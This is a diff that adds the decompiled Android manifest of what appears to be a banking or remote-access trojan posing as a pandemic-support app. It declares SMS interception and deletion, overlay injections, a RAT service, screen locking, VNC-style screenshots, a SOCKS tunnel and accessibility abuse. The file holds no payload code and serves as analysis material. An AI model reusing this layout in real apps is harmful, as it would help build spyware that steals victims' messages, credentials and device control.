@@ -1,0 +1,452 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest
+    xmlns:android="http://schemas.android.com/apk/res/android"
+    android:versionCode="1"
+    android:versionName="1.0"
+    android:compileSdkVersion="28"
+    android:compileSdkVersionCodename="9"
+    package="naqsl.ebxcb.exu"
+    platformBuildVersionCode="28"
+    platformBuildVersionName="9">
+
+    <uses-sdk
+        android:minSdkVersion="15"
+        android:targetSdkVersion="28" />
+
+    <uses-permission
+        android:name="android.permission.INTERNET" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_NETWORK_STATE" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.READ_EXTERNAL_STORAGE" />
+
+    <uses-permission
+        android:name="android.permission.WAKE_LOCK" />
+
+    <uses-permission
+        android:name="android.permission.GET_TASKS" />
+
+    <uses-permission
+        android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <uses-permission
+        android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
+
+    <uses-permission
+        android:name="android.permission.PACKAGE_USAGE_STATS" />
+
+    <uses-permission
+        android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_COARSE_LOCATION" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_FINE_LOCATION" />
+
+    <uses-permission
+        android:name="android.permission.FOREGROUND_SERVICE" />
+
+    <uses-permission
+        android:name="android.permission.CALL_PHONE" />
+
+    <uses-permission
+        android:name="android.permission.SEND_SMS" />
+
+    <uses-permission
+        android:name="android.permission.RECORD_AUDIO" />
+
+    <uses-permission
+        android:name="android.permission.READ_CONTACTS" />
+
+    <uses-permission
+        android:name="android.permission.READ_PHONE_STATE" />
+
+    <uses-permission
+        android:name="android.permission.RECEIVE_SMS" />
+
+    <uses-permission
+        android:name="android.permission.READ_SMS" />
+
+    <uses-permission
+        android:name="android.permission.WRITE_SMS" />
+
+    <uses-permission
+        android:name="android.permission.KILL_BACKGROUND_PROCESSES" />
+
+    <uses-permission
+        android:name="android.permission.ACCESS_WIFI_STATE" />
+
+    <uses-permission
+        android:name="android.permission.CHANGE_WIFI_STATE" />
+
+    <uses-permission
+        android:name="android.permission.MODIFY_PHONE_STATE" />
+
+    <uses-permission
+        android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
+
+    <uses-permission
+        android:name="android.permission.CHANGE_NETWORK_STATE" />
+
+    <application
+        android:theme="@ref/0x01030010"
+        android:label="pandemidestek"
+        android:icon="@ref/0x7f080000"
+        android:name="naqsl.ebxcb.exu.MainApplication"
+        android:allowBackup="true"
+        android:supportsRtl="true"
+        android:usesCleartextTraffic="true"
+        android:appComponentFactory="android.support.v4.app.CoreComponentFactory">
+
+        <activity
+            android:theme="@ref/0x01030010"
+            android:name="com.google.android.gms.common.api.GoogleApiActivity"
+            android:exported="false" />
+
+        <meta-data
+            android:name="com.google.android.gms.version"
+            android:value="12211000" />
+
+        <meta-data
+            android:name="android.support.VERSION"
+            android:value="26.1.0" />
+
+        <meta-data
+            android:name="android.arch.lifecycle.VERSION"
+            android:value="27.0.0-SNAPSHOT" />
+
+        <activity
+            android:name="naqsl.ebxcb.exu.Activity.MainActivity">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.MAIN" />
+
+                <category
+                    android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <receiver
+            android:name="naqsl.ebxcb.exu.Receiver.ReceiverMms"
+            android:permission="android.permission.BROADCAST_SMS">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.provider.Telephony.SMS_DELIVER" />
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="naqsl.ebxcb.exu.Receiver.RecieverPushService"
+            android:permission="android.permission.BROADCAST_WAP_PUSH"
+            android:enabled="true">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.provider.Telephony.WAP_PUSH_DELIVER" />
+
+                <data
+                    android:mimeType="application/vnd.wap.mms-message" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:name="naqsl.ebxcb.exu.SendSms">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.SEND" />
+
+                <action
+                    android:name="android.intent.action.SENDTO" />
+
+                <data
+                    android:scheme="sms" />
+
+                <data
+                    android:scheme="smsto" />
+
+                <data
+                    android:scheme="mms" />
+
+                <data
+                    android:scheme="mmsto" />
+
+                <category
+                    android:name="android.intent.category.DEFAULT" />
+
+                <category
+                    android:name="android.intent.category.BROWSABLE" />
+            </intent-filter>
+        </activity>
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceHeadlessSmsSend"
+            android:permission="android.permission.SEND_RESPOND_VIA_MESSAGE"
+            android:exported="true">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.intent.action.RESPOND_VIA_MESSAGE" />
+
+                <category
+                    android:name="android.intent.category.DEFAULT" />
+
+                <data
+                    android:scheme="sms" />
+
+                <data
+                    android:scheme="smsto" />
+
+                <data
+                    android:scheme="mms" />
+
+                <data
+                    android:scheme="mmsto" />
+            </intent-filter>
+        </service>
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceInjections"
+            android:enabled="true"
+            android:exported="true" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceGeolocationNetwork"
+            android:enabled="true"
+            android:exported="true" />
+
+        <receiver
+            android:name="naqsl.ebxcb.exu.Receiver.ReceiverBoot">
+
+            <intent-filter
+                android:priority="979">
+
+                <action
+                    android:name="android.intent.action.BOOT_COMPLETED" />
+
+                <action
+                    android:name="android.intent.action.QUICKBOOT_POWERON" />
+
+                <action
+                    android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
+
+                <action
+                    android:name="android.intent.action.USER_PRESENT" />
+
+                <action
+                    android:name="android.intent.action.PACKAGE_ADDED" />
+
+                <action
+                    android:name="android.intent.action.PACKAGE_REMOVED" />
+
+                <action
+                    android:name="android.provider.Telephony.SMS_RECEIVED" />
+
+                <action
+                    android:name="android.intent.action.SCREEN_ON" />
+
+                <action
+                    android:name="android.intent.action.EXTERNAL_APPLICATIONS_AVAILABLE" />
+
+                <category
+                    android:name="android.intent.category.HOME" />
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+
+                <action
+                    android:name="android.net.conn.CONNECTIVITY_CHANGE" />
+
+                <action
+                    android:name="android.net.wifi.WIFI_STATE_CHANGED" />
+
+                <action
+                    android:name="android.intent.action.DREAMING_STOPPED" />
+            </intent-filter>
+        </receiver>
+
+        <activity
+            android:theme="@ref/0x01030055"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityPermissions"
+            android:excludeFromRecents="true" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.API.Screenshot.ActivityScreenshot" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityInjection"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityGetNumber"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityAlert1"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityGetSMS"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityAlert2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityStartUSSD"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityPushInjection"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityOpenURL"
+            android:excludeFromRecents="true"
+            android:launchMode="2" />
+
+        <receiver
+            android:name="naqsl.ebxcb.exu.Receiver.ReceiverAlarm"
+            android:enabled="true"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceCommands"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.StartWhileGlobal"
+            android:enabled="true"
+            android:exported="true" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceGeolocationGPS"
+            android:enabled="true"
+            android:exported="true" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceDeleteSMS"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceModuleNotification"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceToast"
+            android:enabled="true"
+            android:exported="true" />
+
+        <service
+            android:label="pandemidestek"
+            android:name="naqsl.ebxcb.exu.ServiceAccessibility"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+
+            <intent-filter>
+
+                <action
+                    android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@ref/0x7f0c0001" />
+        </service>
+
+        <service
+            android:name="naqsl.ebxcb.exu.StartWhileRequest"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.API.Screenshot.ServiceScreenshot"
+            android:exported="true" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.API.Screenshot.ServiceSendRequestImageVNC"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceRAT"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceFindFiles"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.accessibilityImage"
+            android:enabled="true"
+            android:exported="true" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityScreenLocker" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityAccessibility" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.ActivityPlayProtect" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.firstInstall" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.socks.ServiceForwardingTunel"
+            android:exported="false" />
+
+        <activity
+            android:label="@string/0x18"
+            android:icon="@ref/0x7f040000"
+            android:name="naqsl.ebxcb.exu.Activity.LookScreen" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServiceLookScreen"
+            android:exported="false" />
+
+        <service
+            android:name="naqsl.ebxcb.exu.ServicePedometer" />
+    </application>
+</manifest>
